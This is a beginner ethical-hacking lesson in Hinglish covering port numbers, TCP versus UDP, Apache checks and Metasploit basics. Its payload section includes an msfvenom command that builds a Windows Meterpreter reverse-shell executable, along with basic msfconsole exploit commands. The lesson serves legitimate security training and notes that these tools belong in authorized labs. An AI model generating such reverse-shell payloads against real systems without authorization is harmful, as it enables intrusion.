# Day 7 - Port Numbers, Protocols & Metasploit Basics

## Port Number Kya Hota Hai?

Port ek logical communication endpoint hota hai jo network services ko identify karta hai.

Simple words me:

IP Address batata hai system ka address.

Port Number batata hai system ke andar kaunsi service chal rahi hai.

### Real Life Example

Agar ek building ka address IP Address hai, to us building ke different rooms Port Numbers hain.

Example:

* House Address = IP Address
* Room Number = Port Number

---

## Port Number Range

| Range         | Type                    |
| ------------- | ----------------------- |
| 0 - 1023      | Well Known Ports        |
| 1024 - 49151  | Registered Ports        |
| 49152 - 65535 | Dynamic / Private Ports |

---

# Well Known Ports

Ye sabse common ports hote hain jo network services use karti hain.

| Port | Protocol | Service           |
| ---- | -------- | ----------------- |
| 20   | TCP      | FTP Data Transfer |
| 21   | TCP      | FTP Control       |
| 22   | TCP      | SSH               |
| 23   | TCP      | Telnet            |
| 25   | TCP      | SMTP              |
| 53   | TCP/UDP  | DNS               |
| 67   | UDP      | DHCP Server       |
| 68   | UDP      | DHCP Client       |
| 69   | UDP      | TFTP              |
| 80   | TCP      | HTTP              |
| 110  | TCP      | POP3              |
| 123  | UDP      | NTP               |
| 143  | TCP      | IMAP              |
| 161  | UDP      | SNMP              |
| 389  | TCP/UDP  | LDAP              |
| 443  | TCP      | HTTPS             |
| 445  | TCP      | SMB               |
| 3306 | TCP      | MySQL             |
| 3389 | TCP      | RDP               |
| 5432 | TCP      | PostgreSQL        |

### Important Ports for Ethical Hacking

* 21 → FTP
* 22 → SSH
* 23 → Telnet
* 80 → HTTP
* 443 → HTTPS
* 445 → SMB
* 3306 → MySQL
* 3389 → RDP

Ye ports reconnaissance aur penetration testing me frequently milte hain.

---

# Protocol Kya Hota Hai?

Protocol rules ka set hota hai jo devices ko communication karne me help karta hai.

Simple words me:

Protocol = Communication Language

Example:

Agar do log alag language bolte hain to communication mushkil ho jata hai.

Waise hi computers protocols ke through communicate karte hain.

---

# TCP/IP Protocol

TCP/IP internet ka backbone hai.

TCP (Transmission Control Protocol)

Kaam:

* Reliable communication
* Error checking
* Data delivery confirmation

Features:

* Connection-Oriented
* Accurate delivery
* Packet loss detection

Example:

File Download

Banking Transactions

Login Authentication

---

# UDP Protocol

UDP (User Datagram Protocol)

Kaam:

Fast communication provide karna.

Features:

* Connectionless
* No delivery guarantee
* Faster than TCP

Example:

* Video Streaming
* Online Gaming
* VoIP Calls
* DNS Queries

---

# TCP vs UDP

| Feature        | TCP       | UDP     |
| -------------- | --------- | ------- |
| Connection     | Yes       | No      |
| Reliable       | Yes       | No      |
| Speed          | Slower    | Faster  |
| Error Checking | Yes       | Limited |
| Streaming      | No        | Yes     |
| Gaming         | Less Used | Common  |

### Easy Trick

TCP = Accuracy First

UDP = Speed First

---

# Apache Server

Apache ek open-source web server hai jo websites ko host karne ke liye use hota hai.

Work:

* Website host karna
* HTTP requests handle karna
* Web pages serve karna

Example:

Jab user browser me website open karta hai:

Browser → Apache Server → Website Response

---

## Apache Default Ports

| Port | Service |
| ---- | ------- |
| 80   | HTTP    |
| 443  | HTTPS   |

---

## Apache Server Information Gathering

Useful Commands:

Linux:

```bash
apache2 -v
```

or

```bash
httpd -v
```

Service Status:

```bash
systemctl status apache2
```

---

# Payload Kya Hota Hai?

Payload exploit ka wo part hota hai jo successful exploitation ke baad execute hota hai.

Simple Words:

Exploit = Entry

Payload = Action

Example:

Attacker system me access le leta hai.

Uske baad:

* Reverse Shell
* Meterpreter Session
* Command Execution

Ye sab payload ke through hota hai.

---

# Payload Types

## 1. Singles Payload

Single task perform karta hai.

Example:

```bash
windows/shell_bind_tcp
```

---

## 2. Stagers Payload

Connection establish karta hai.

Example:

```bash
windows/meterpreter/reverse_tcp
```

---

## 3. Stages Payload

Additional functionality load karta hai.

Example:

```bash
meterpreter
```

---

# MSFVenom

MSFVenom Metasploit ka payload generation tool hai.

Use:

* Payload create karna
* Shell generate karna
* Testing environments ke liye executables banana

Example:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe
```

Note:

Payload generation sirf authorized lab environments me hi use karna chahiye.

---

# Metasploit Framework

Metasploit ek penetration testing framework hai jo vulnerability assessment aur security testing ke liye use hota hai.

Features:

* Vulnerability Scanning
* Exploitation
* Payload Generation
* Post Exploitation
* Reporting

---

# Metasploit Modules

Metasploit alag-alag modules provide karta hai.

## 1. Auxiliary Module

Purpose:

Information Gathering aur Scanning.

Examples:

* Port Scanning
* Service Enumeration
* Banner Grabbing

Use Cases:

* Reconnaissance
* Enumeration

---

## 2. Exploit Module

Purpose:

Target vulnerability ko exploit karna.

Work:

* Vulnerability trigger karna
* Access gain karna

Examples:

* SMB Vulnerability
* Web Application Vulnerability

---

## 3. Payload Module

Purpose:

Exploit successful hone ke baad action perform karna.

Examples:

* Reverse Shell
* Meterpreter
* Command Shell

---

## 4. Post Module

Purpose:

Post-exploitation activities.

Examples:

* System Enumeration
* User Information Collection
* Privilege Analysis

---

## 5. Encoder Module

Purpose:

Payload encoding.

Benefits:

* Payload obfuscation
* Format conversion

---

## 6. NOP Module

NOP = No Operation

Purpose:

Payload reliability improve karna.

---

# Basic Metasploit Commands

Start Metasploit:

```bash
msfconsole
```

Search Module:

```bash
search apache
```

Select Module:

```bash
use exploit/example
```

Show Options:

```bash
show options
```

Set Value:

```bash
set RHOSTS <target-ip>
```

Run Module:

```bash
run
```

or

```bash
exploit
```

---

# Real World Workflow

1. Information Gathering
2. Port Scanning
3. Service Enumeration
4. Vulnerability Identification
5. Exploitation
6. Payload Execution
7. Post Exploitation
8. Reporting

---

# Quick Recap

| Topic           | Meaning                   |
| --------------- | ------------------------- |
| Port Number     | Service Identifier        |
| Well Known Port | Common Service Ports      |
| TCP             | Reliable Communication    |
| UDP             | Fast Communication        |
| Apache          | Web Server                |
| Payload         | Action After Exploitation |
| MSFVenom        | Payload Generator         |
| Auxiliary       | Scanning & Enumeration    |
| Exploit         | Vulnerability Execution   |
| Payload Module  | Post-Access Action        |
| Post Module     | Post Exploitation         |
| Encoder         | Payload Encoding          |
| NOP             | Reliability Improvement   |

# Final Thought

Port numbers network services ko identify karte hain, protocols communication ko possible banate hain, aur Metasploit security professionals ko vulnerabilities ko safely test karne me help karta hai.

### Golden Rule

"Scan Smart, Test Legally, Report Responsibly."
